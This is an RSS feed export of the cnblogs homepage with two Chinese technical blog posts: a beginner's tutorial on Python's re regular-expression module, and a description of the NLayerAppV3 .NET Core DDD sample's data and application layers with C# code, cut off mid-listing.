<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>python re库的正则表达式学习笔记 - 唐玮</title>
<link>http://www.cnblogs.com/wtang/p/10490046.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wtang/p/10490046.html</guid>
<description>&lt;p&gt;&lt;strong&gt;1. 安装&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;默认已经安装好了python环境了&lt;/p&gt;
&lt;p&gt;re库是python3的核心库，不需要pip install，直接import就行&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2. 最简单的模式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;字符本身就是最简单的模式&lt;/p&gt;
&lt;p&gt;比如：'A', 'I love you', 'test'&lt;/p&gt;
&lt;p&gt;然是注意在定义模式字符串的时候，在前面加上r，它的作用是告诉编译器，接下来的字符串是单纯的字符串，&lt;a href=&quot;http://www.codecodex.com/wiki/Escape_sequences_and_escape_characters#Python&quot; target=&quot;_blank&quot;&gt;请不要转变为转义字符&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;例子&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; re
pattern &lt;/span&gt;= r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
sequence &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
re.match(pattern, sequence)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;re.Match object; span=(0, 6), match=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;re.match()是常用的函数，如果匹配，返回的是re.Match object.一个库内置的对象。如果没有匹配返回的是None&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3. 通配符&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在正则表达式中，有些字符是有特殊意义的（不是转义字符的那套规则），下面介绍常用的通配符字符&lt;/p&gt;
&lt;p&gt;1）&quot;.&quot;：点，代表任何字符，除了换行（newline）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Co.k.e&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中group()函数返回匹配的字符，返回类型是str&lt;/p&gt;

&lt;p&gt;2) &quot;\w&quot; 反斜杠小写w，代表任何单个字母，数字，下划线&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Co\wk\we&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;3) &quot;\W&quot; 反斜杠大写W，代表任何2)中没有代表的字符&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;C\Wke&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;C@ke&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;4) &quot;\s&quot; 反斜杠小写s，代表一些空格字符，比如空格(space)，换行(new line)，跳格键(tab)，回车(return)&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Eat\scake&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Eat cake&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Eat cake&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;5) &quot;\S&quot; 反斜杠大写S，代表任何4)中没有代表的字符&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Cook\Se&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;6) &quot;\t&quot; 反斜杠小写t，代表跳格键(tab)&lt;/p&gt;
&lt;p&gt;7) &quot;\n&quot; 反斜杠小写t，代表换行(new line)&lt;/p&gt;
&lt;p&gt;8) &quot;\r&quot; 反斜杠小写t，代表回车(return)&lt;/p&gt;
&lt;p&gt;9) &quot;\d&quot; 反斜杠小写d，代表单个数字0-9&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;c\d\dkie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;c00kie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;10) &quot;^&quot; 这个键不知道叫什么，代表从字符开头要匹配&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;^Eat&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Eat cake&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;11) &quot;$&quot; 美元符号，代表从字符结尾要匹配&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;cake$&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Eat cake&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;12) &quot;[abc]&quot; 中括号中任意字符，代表匹配其中任意字符&lt;/p&gt;
&lt;p&gt;常用的方式，比如[a-zA-Z0-9]，或者如果中括号中第一个字符是&quot;^&quot;，代表不是这个范围内的字符&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Number: [0-6]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Number: 5&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;re.Match object; span=(0, 9), match=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Number: 5&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;再来个不在范围内的&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Number: [^0-6]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Number: 7&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;re.Match object; span=(0, 9), match=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Number: 7&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;4. 重复&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第三部分介绍了单个通配符，那么怎么定义一串通配符呢，利用一些重复的标志&lt;/p&gt;
&lt;p&gt;1) &quot;+&quot; 加号，表示在它左边的字符出现一次或者多次&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Co+kie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Cooookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&amp;lt;re.Match object; span=(0, 8), match=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Cooookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2) &quot;*&quot; 乘号，表示在它左边的字符出现零次或者多次&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Ca*o*kie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Caokie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;3) &quot;?&quot; 问号，表示在它左边的字符出现零次或者一次&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Colou?r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Color&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;4) {x} 大括号加数字，重复确切几次&lt;/p&gt;
&lt;p&gt;5) {x,} 重复至少几次&lt;/p&gt;
&lt;p&gt;6) {x, y} 重复至少x次，不超过y次&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;\d{9,10}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;0987654321&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).group()
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&lt;span&gt;'&lt;/span&gt;&lt;span&gt;0987654321&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;5. 分组&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比如说想定义一个email的格式，@之前的是一个规则，之后的是一个规则，那么通过（）圆括号来分为两组，分别定义在一个正则表达式中&lt;/p&gt;
&lt;p&gt;然后如果满足的话，通过group()函数指定返回哪一组的结果&lt;/p&gt;
&lt;p&gt;比如&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
email_address = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;Please contact us at: support@datacamp.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
match &lt;/span&gt;= re.search(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;([\w+-]+)@([\w\.-]+)&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;tw7613781@gmail.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; match:
  &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(match.group()) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; The whole matched text&lt;/span&gt;
  &lt;span&gt;print&lt;/span&gt;(match.group(1)) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; The username (group 1)&lt;/span&gt;
  &lt;span&gt;print&lt;/span&gt;(match.group(2)) &lt;span&gt;#&lt;/span&gt;&lt;span&gt; The host (group 2)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;tw7613781@gmail.com
tw7613781
gmail.com&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;@前为第一部分，\w代表代表任何单个字母，数字，下划线，上面已经介绍了，然后就是&quot;\w&quot;和&quot;+&quot;和&quot;-&quot;随便哪一个至少一个或者多个&lt;/p&gt;
&lt;p&gt;@后为第二部分，其余一样，就是多了个&quot;\.&quot;，因为&quot;.&quot;代表的是任意字符了，如果想表达真正的点，用&quot;\.&quot;来表示。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6. python库函数re的常用函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1) re.search(pattern, string)和re.match(pattern, string)&lt;/p&gt;
&lt;p&gt;区别在于search能从string中寻找任何满足pattern的substring，但是match必须从头开始&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
pattern = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;cookie&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
sequence &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Cake and cookie&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;

re.search(pattern, sequence).group()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;如果是match会返回None&lt;/p&gt;
&lt;p&gt;2) re.findall(pattern, string)&lt;/p&gt;
&lt;p&gt;寻找string所有满足pattern的substring，然后以list的形式返回&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
email_address = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Please contact us at: support@datacamp.com, xyz@datacamp.com&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;'addresses' is a list that stores all the possible match&lt;/span&gt;
addresses = re.findall(r&lt;span&gt;'&lt;/span&gt;&lt;span&gt;[\w\.-]+@[\w\.-]+&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, email_address)
&lt;/span&gt;&lt;span&gt;for&lt;/span&gt; address &lt;span&gt;in&lt;/span&gt;&lt;span&gt; addresses: 
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(address)
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;support@datacamp.com
xyz@datacamp.com&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3) re.compile(pattern)&lt;/p&gt;
&lt;p&gt;通过compile函数会生成一个pattern对象，这个pattern对象可以直接使用match，search等函数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
In: pattern = re.compile(r&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;cookie&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
In: pattern
Out: re.compile(r&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;, re.UNICODE)
In: pattern.search(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
Out: &lt;/span&gt;&amp;lt;re.Match object; span=(0, 6), match=&lt;span&gt;'&lt;/span&gt;&lt;span&gt;cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&amp;gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;学习材料&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.datacamp.com/community/tutorials/python-regular-expression-tutorial&quot; target=&quot;_blank&quot;&gt;https://www.datacamp.com/community/tutorials/python-regular-expression-tutorial&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 07 Mar 2019 07:42:00 +0000</pubDate>
<dc:creator>唐玮</dc:creator>
<og:description>1. 安装 默认已经安装好了python环境了 re库是python3的核心库，不需要pip install，直接import就行 2. 最简单的模式 字符本身就是最简单的模式 比如：'A</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wtang/p/10490046.html</dc:identifier>
</item>
<item>
<title>NLayerAppV3-Infrastructure（基础结构层）的Data部分和Application（应用层） - net-yuan</title>
<link>http://www.cnblogs.com/net-yuan/p/NLayerAppV3-Infrastructure_Application.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/net-yuan/p/NLayerAppV3-Infrastructure_Application.html</guid>
<description>&lt;p&gt;&lt;strong&gt;回顾：NLayerAppV3是一个使用.net 2.1实现的经典DDD的分层架构的项目。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NLayerAppV3是在NLayerAppV2的基础上，使用.net core2.1进行重新构建的；它包含了开发人员和架构师都可以重用的DDD层。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Github地址：&lt;a href=&quot;https://github.com/cesarcastrocuba/nlayerappv3&quot; target=&quot;_blank&quot;&gt;https://github.com/cesarcastrocuba/nlayerappv3&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;NLayerAppV3的基础结构层一共分为两个部分。处理数据相关的基础组件和Cross-Cutting的基础组件。&lt;/p&gt;
&lt;p&gt;处理数据相关的基础组件主要包含UOW和仓储的实现；&lt;/p&gt;
&lt;p&gt;Cross-Cutting的基础组件目前主要包含数据适配器、国际化、验证；&lt;/p&gt;
&lt;p&gt;本篇介绍&lt;strong&gt;NLayerAppV3的Infrastructure（基础结构层）的Data部分和Application（应用层）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、&lt;/strong&gt;Infrastructure（基础结构层）的Data部分&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Data部分是处理数据相关的基础组件主要包含UOW和仓储的实现。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;UOW的实现：BaseContext继承了DbContext和IQueryableUnitOfWork&lt;br/&gt;DbContext是EF Core数据库上下文，包Microsoft.EntityFrameworkCore&lt;br/&gt;IQueryableUnitOfWork继承IUnitOfWork和ISql,是EF Core方式的契约定义&lt;/p&gt;
&lt;p&gt;Isql定义了支持sql语句的方式&lt;/p&gt;
&lt;p&gt;Repository仓储的层超类型，通过构造函数注入了IQueryableUnitOfWork和ILogger，定义了EF Core方式的CURD以及查询过滤，包括分页等行为&lt;/p&gt;
&lt;p&gt;MainBCUnitOfWork实现了BaseContext。示例使用内存数据库的方式来演示，当然，根据实际需要，可以很容易地扩展使用sqlserver、mysql、sqlite等，这也符合了开闭原则&lt;/p&gt;
&lt;p&gt;BankAccountRepository是BankAccount仓储，继承Repository&amp;lt;BankAccount&amp;gt;,IBankAccountRepository，通过构造函数注入了MainBCUnitOfWork和ILogger，提供了一个GetAll方法，用来获取BankAccount的集合。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('35a10e69-7845-4bc6-93de-5297fca3f269')&quot; readability=&quot;34&quot;&gt;&lt;img id=&quot;code_img_closed_35a10e69-7845-4bc6-93de-5297fca3f269&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_35a10e69-7845-4bc6-93de-5297fca3f269&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('35a10e69-7845-4bc6-93de-5297fca3f269',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_35a10e69-7845-4bc6-93de-5297fca3f269&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;63&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; BankAccountRepository
        :Repository&lt;/span&gt;&amp;lt;BankAccount&amp;gt;&lt;span&gt;,IBankAccountRepository
    {
        &lt;/span&gt;&lt;span&gt;#region&lt;/span&gt; Constructor

        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Create a new instance
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;unitOfWork&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;Associated unit of work&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;logger&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;Logger&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt;&lt;span&gt; BankAccountRepository(MainBCUnitOfWork unitOfWork,
            ILogger&lt;/span&gt;&amp;lt;Repository&amp;lt;BankAccount&amp;gt;&amp;gt;&lt;span&gt; logger)
            : &lt;/span&gt;&lt;span&gt;base&lt;/span&gt;&lt;span&gt;(unitOfWork, logger)
        {
            
        }

        &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;

        &lt;span&gt;#region&lt;/span&gt; Overrides

        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Get all bank accounts and the customer information
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&lt;/span&gt;&lt;span&gt;Enumerable collection of bank accounts&lt;/span&gt;&lt;span&gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; IEnumerable&amp;lt;BankAccount&amp;gt;&lt;span&gt; GetAll()
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; currentUnitOfWork = &lt;span&gt;this&lt;/span&gt;.UnitOfWork &lt;span&gt;as&lt;/span&gt;&lt;span&gt; MainBCUnitOfWork;

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; &lt;span&gt;set&lt;/span&gt; = currentUnitOfWork.CreateSet&amp;lt;BankAccount&amp;gt;&lt;span&gt;();

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;set&lt;/span&gt;.Include(ba =&amp;gt;&lt;span&gt; ba.Customer)
                      .AsEnumerable();
            
        }
        &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;&lt;span&gt;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;2、Application（应用层）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;协调领域模型与其它应用、包括事务调度、UOW、数据转换等。&lt;/strong&gt;&lt;br/&gt;IService定义了应用层服务的契约。Service实现了IService，通过构造函数注入IRepository，为什么要注入IRepository?&lt;br/&gt;因为要获取实体的相关信息，就必须通过仓储去操作聚合，而聚合是通过聚合根跟外部联系的。&lt;br/&gt;ProjectionsExtensionMethods作用是使用扩展方法，将实体转换为DTO或者将实体集合转换为DTO的集合&lt;br/&gt;IBankAppService定义了Bank的应用层契约。有开户、查找账户、锁定账户、查找账户活动集、转账等业务。&lt;br/&gt;BankAppService实现了IBankAppService。通过构造函数注入IBankAccountRepository、ICustomerRepository、IBankTransferService、ILogger。&lt;br/&gt;IBankAccountRepository是BankAccount的仓储契约；&lt;br/&gt;ICustomerRepository是Customer用户的仓储契约；&lt;br/&gt;IBankTransferService是转账的领域服务；&lt;/p&gt;
&lt;p&gt;转账方法的代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('89c954a4-ddeb-4297-ae82-18020476aad3')&quot; readability=&quot;35&quot;&gt;&lt;img id=&quot;code_img_closed_89c954a4-ddeb-4297-ae82-18020476aad3&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_89c954a4-ddeb-4297-ae82-18020476aad3&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('89c954a4-ddeb-4297-ae82-18020476aad3',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_89c954a4-ddeb-4297-ae82-18020476aad3&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;65&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; PerformBankTransfer(BankAccountDTO fromAccount, BankAccountDTO toAccount, &lt;span&gt;decimal&lt;/span&gt;&lt;span&gt; amount)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Application-Logic Process: 
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1º Get Accounts objects from Repositories
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 2º Start Transaction
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 3º Call PerformTransfer method in Domain Service
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 4º If no exceptions, commit the unit of work and complete transaction&lt;/span&gt;

            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (BankAccountHasIdentity(fromAccount)
                &lt;/span&gt;&amp;amp;&amp;amp;&lt;span&gt;
                BankAccountHasIdentity(toAccount))
            {
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; source =&lt;span&gt; _bankAccountRepository.Get(fromAccount.Id);
                &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; target =&lt;span&gt; _bankAccountRepository.Get(toAccount.Id);

